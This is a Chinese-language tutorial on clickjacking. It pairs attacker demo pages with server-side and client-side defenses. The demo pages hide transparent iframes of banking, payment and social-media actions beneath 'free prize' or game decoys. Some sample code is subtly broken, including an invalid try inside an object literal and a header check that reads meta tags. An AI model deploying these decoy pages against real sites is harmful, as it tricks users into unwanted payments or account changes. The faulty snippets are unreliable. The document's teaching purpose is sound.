# 点击劫持 ( Clickjacking )

`#前端安全`  

## 总结

- 原理
	- 点击劫持是一种**视觉欺骗攻击**
	- 攻击者通过将**目标网站嵌入到恶意网站中的透明 iframe 中**，诱导用户在不知情的情况下点击看似正常但实际是隐藏的恶意内容。
	- 点击劫持通过**视觉欺骗手段**，诱导用户在不知情的情况下点击隐藏的页面元素。
- 基本流程
	1. 攻击者**创建一个诱饵页面**
	2. 将**目标网站**通过 iframe 嵌入到诱饵页面
	3. 使用 **CSS 将 iframe 设置为透明**
	4. 在 iframe 上层放置诱人的内容
	5. 诱导用户点击，实际点击到了透明 iframe 中的按钮
- 具体危害
	- 强制关注特定账号
	- 点赞/转发恶意内容
	- 诱导转账购买商品
	- 同意隐私政策
	- 等
- 防范
	- 客户端
		- JS 检测页面是否被嵌入框架：
			- `window.self !== window.top`
		- 使用 SameSite Cookie 属性
	- 服务端
		- X-Frame-Options 头
			- ![图片](https://832-1310531898.cos.ap-beijing.myqcloud.com/999.%20Obsidian@832/files/20250105.png)
		- CSP 
			- frame-ancestors 指令
			- ![图片](https://832-1310531898.cos.ap-beijing.myqcloud.com/999.%20Obsidian@832/files/20250105-1.png)
	- 重要操作二次确定
		- 安全警告：请直接访问我们的网站进行操作
		- 重要操作验证码

## 1. 点击劫持原理

- 点击劫持是一种**视觉欺骗攻击**
- 攻击者通过将**目标网站嵌入到恶意网站中的透明 iframe 中**，诱导用户在不知情的情况下点击看似正常但实际是隐藏的恶意内容。
- 点击劫持通过**视觉欺骗手段**，诱导用户在不知情的情况下点击隐藏的页面元素。

### 1.1. 基本步骤：

1. 攻击者创建一个诱饵页面
2. 将目标网站通过 iframe 嵌入到诱饵页面
3. 使用 **CSS 将 iframe 设置为透明**
4. 在 iframe 上层放置诱人的内容
5. 诱导用户点击，实际点击到了透明 iframe 中的按钮

## 2. 攻击示例

### 2.1. 基础攻击示例

```html
  <!DOCTYPE html>
  <html>
  <head>
    <title>Clickjacking Demo</title>
    <style>
      .wrapper {
        position: relative;
        width: 500px;
        height: 300px;
      }
      
      .decoy-content {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 2;
        background-color: white;
      }
      
      .target-iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3; /* 设置透明度用于演示，实际攻击中通常设为0 */
        z-index: 1;
      }
      
      .decoy-button {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        padding: 10px 20px;
        background-color: `#4CAF50;`
        color: white;
        border: none;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <div class="wrapper">
      <!-- 目标网站的iframe -->
      <iframe class="target-iframe" src="https://target-website.com"></iframe>
      <!-- 诱饵内容 -->
      <div class="decoy-content">
        <h2>赢取免费奖品！</h2>
        <button class="decoy-button">点击领取</button>
      </div>
    </div>
  </body>
  </html>

````

### 2.2. 更复杂的攻击示例

```html
  <!DOCTYPE html>
  <html>
  <head>
    <title>Advanced Clickjacking Demo</title>
    <style>
      .game-container {
        position: relative;
        width: 800px;
        height: 600px;
        margin: 0 auto;
        border: 1px solid `#ccc;`
        overflow: hidden;
      }
      
      .game-layer {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 2;
      }
      
      .target-frame {
        position: absolute;
        width: 1200px;
        height: 800px;
        top: -100px;
        left: -200px;
        opacity: 0;
        z-index: 1;
        transform: scale(0.8);
        pointer-events: auto;
      }
      
      .game-element {
        position: absolute;
        cursor: pointer;
      }
      
      .score-display {
        position: fixed;
        top: 10px;
        right: 10px;
        padding: 10px;
        background: `#333;`
        color: white;
      }
    </style>
  </head>
  <body>
    <div class="score-display">得分: <span id="score">0</span></div>
    
    <div class="game-container">
      <!-- 目标网站iframe -->
      <iframe class="target-frame" src="https://target-website.com"></iframe>
      
      <!-- 游戏层 -->
      <div class="game-layer">
        <div class="game-element" style="top: 50%; left: 50%;">
          <img src="game-target.png" alt="游戏目标">
        </div>
      </div>
    </div>
    
    <script>
      // 游戏逻辑，实际会诱导用户点击特定位置
      document.querySelector('.game-layer').addEventListener('click', (e) => {
        const score = document.getElementById('score');
        score.textContent = parseInt(score.textContent) + 10;
      });
    </script>
  </body>
  </html>
````

## 3. 防御措施

### 3.1. 服务器端防御

#### 3.1.1. 设置 X-Frame-Options 响应头

>  `X-Frame-Options` 用于设置网站通过 iframe 的方式嵌入的条件或规则


```javascript hl:6,9,3
// Express.js 示例
app.use((req, res, next) => {
    // 禁止所有框架嵌入
    res.setHeader('X-Frame-Options', 'DENY');
    
    // 或只允许同源框架嵌入
    // res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    
    // 或允许特定域名嵌入
    // res.setHeader('X-Frame-Options', 'ALLOW-FROM https://trusted-site.com');
    
    next();
});
```

#### 3.1.2. 使用 Content Security Policy (CSP)

```javascript hl:3,6,9
// Express.js 示例
app.use((req, res, next) => {
    // 禁止所有框架嵌入
    res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
    
    // 或只允许同源框架嵌入
    // res.setHeader('Content-Security-Policy', "frame-ancestors 'self'");
    
    // 或允许特定域名嵌入
    // res.setHeader('Content-Security-Policy', "frame-ancestors 'self' https://trusted-site.com");
    
    next();
});
```

### 3.2. 客户端防御

#### 3.2.1. JavaScript 框架检测

```javascript
// 检测页面是否被嵌入框架
function detectFraming() {
    if (window.self !== window.top) {
        // 页面被嵌入框架
        window.top.location = window.self.location;
    }
}

// 页面加载时执行检测
window.onload = detectFraming;
```

#### 3.2.2. 使用 SameSite Cookie 属性

```javascript
// 设置 Cookie
document.cookie = "session=value; SameSite=Strict";
```

### 3.3. Frame Busting 代码

```javascript
// 基础版本
if (top != self) {
    top.location = self.location;
}

// 更安全的版本
(function() {
    if (self == top) {
        return;
    }
    
    try {
        // 尝试访问父窗口来确认是否被嵌入
        if (parent.frames.length > 0) {
            top.location = self.location;
        }
    } catch(e) {
        // 如果访问被阻止，说明可能是跨域嵌入
        window.document.body.innerHTML = 
            '此页面不允许在框架中显示。';
    }
})();
```

## 4. 最佳实践建议

1. **多层防御**
	- 同时使用多种防御措施
	- 服务器端和客户端防御结合
	- 定期检查防御措施的有效性

2. **安全配置检查清单**
```javascript
// 安全配置检查函数
function securityCheck() {
    const checks = {
        xFrameOptions: !!document.getElementsByTagName('meta')
            .namedItem('X-Frame-Options'),
        csp: !!document.getElementsByTagName('meta')
            .namedItem('Content-Security-Policy'),
        frameDetection: window.self === window.top
    };
    
    console.table(checks);
    return Object.values(checks).every(v => v);
}
```

3. **监控和日志**
```javascript
// 记录可疑行为
function logSuspiciousActivity() {
    if (window.self !== window.top) {
        const suspiciousData = {
            timestamp: new Date().toISOString(),
            referrer: document.referrer,
            parentLocation: try { parent.location.href } catch(e) { 'Access Denied' },
            userAgent: navigator.userAgent
        };
        
        // 发送到日志服务器
        sendToLogServer(suspiciousData);
    }
}
```

4. **定期安全审计**
	- 检查所有入口点
	- 测试防御措施的有效性
	- 更新安全策略

## 5. 示例

```html
<!-- 攻击者的页面 -->
<style>
  .overlay {
    position: absolute;
    top: 0;
    left: 0;
    opacity: 0;  /* 透明的目标页面 */
    z-index: 1;
  }
  .decoy {
    position: absolute;
    top: 0;
    left: 0;
    z-index: 0;
  }
</style>

<div class="decoy">
  <!-- 诱饵内容，例如"点击领取奖励" -->
</div>
<iframe class="overlay" src="https://target-site.com"></iframe>
```

## 6. 具体危害

### 6.1. 社交媒体攻击

- 强制关注特定账号
- 点赞/转发恶意内容
- 发布未经授权的状态更新
```javascript
// 示例：诱导用户点击隐藏的"关注"按钮
<iframe src="https://social-media.com/follow-button" 
        style="opacity: 0; position: absolute;">
</iframe>
```

### 6.2. 账户安全威胁

- 修改账户设置
- 更改密码
- 添加授权设备
```html
<!-- 示例：隐藏的账户设置页面 -->
<div style="position: relative; width: 500px; height: 300px;">
  <iframe src="https://bank.com/settings" 
          style="opacity: 0.0; position: absolute;"></iframe>
  <div style="position: absolute;">
    点击领取优惠券！
  </div>
</div>
```

### 6.3. 金融安全威胁

- 诱导转账
- 购买商品
- 确认支付
```html
<!-- 示例：隐藏的支付确认页面 -->
<div class="game-button">
  <iframe src="https://payment.com/confirm" 
          style="opacity: 0;"></iframe>
  点击开始游戏
</div>
```

### 6.4. 隐私泄露

- 授权访问个人信息
- 同意隐私政策
- 开启设备权限

### 6.5. 广告欺诈

- 虚假点击
- 刷量
- 增加广告展示

## 7. 防护措施

### 7.1. 服务端防护

1. **X-Frame-Options 头**
```http
# 完全禁止iframe嵌入
X-Frame-Options: DENY

# 只允许同源嵌入
X-Frame-Options: SAMEORIGIN

# 允许特定域名嵌入
X-Frame-Options: ALLOW-FROM https://trusted.com
```

2. **CSP frame-ancestors 指令**
```http
# 更现代的防护方式
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self';
Content-Security-Policy: frame-ancestors https://trusted.com;
```

### 7.2. 客户端防护

1. **JavaScript 框架检测**
```javascript
// 检测页面是否被嵌入iframe
if (window !== window.top) {
    window.top.location = window.location;
}
```

2. **样式防护**
```css
/* 防止页面被透明化 */
body {
    background-color: white !important;
}
```

### 7.3. 重要操作防护

1. **二次确认**
```javascript
// 关键操作需要额外确认
function criticalOperation() {
    if (window !== window.top) {
        alert("安全警告：请直接访问我们的网站进行操作");
        return false;
    }
    return confirm("确认执行此操作？");
}
```

2. **验证码保护**
```html
<!-- 添加验证码防护 -->
<form onsubmit="return validateCaptcha()">
    <input type="text" id="captcha">
    <img src="/captcha.php">
</form>
```

## 8. 最佳实践建议

### 8.1. 开发建议

1. **关键操作保护**
   - 使用验证码
   - 要求二次确认
   - 检测异常行为

2. **框架限制**
```javascript
// Vue.js 示例
new Vue({
    mounted() {
        if (window !== window.top) {
            window.top.location = window.location;
        }
    }
});
```

### 8.2. 配置建议

1. **同时使用多层防护**
```http
# 配置示例
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self'
```

2. **定期安全审查**
- 检查框架策略
- 更新安全配置
- 监控异常行为

### 8.3. 用户教育

1. 提醒用户警惕可疑链接
2. 重要操作使用官方应用
3. 定期检查账户活动

## 9. 检测和监控

### 9.1. 自动化检测

```javascript
// 定期检测页面是否被嵌入
setInterval(() => {
    if (window !== window.top) {
        console.log("检测到潜在的点击劫持攻击");
        // 采取相应措施
    }
}, 1000);
```

### 9.2. 日志监控

```javascript
// 记录可疑行为
function logSuspiciousActivity() {
    fetch('/api/security/log', {
        method: 'POST',
        body: JSON.stringify({
            type: 'clickjacking_attempt',
            timestamp: new Date(),
            details: {
                referrer: document.referrer,
                location: window.location.href
            }
        })
    });
}
```
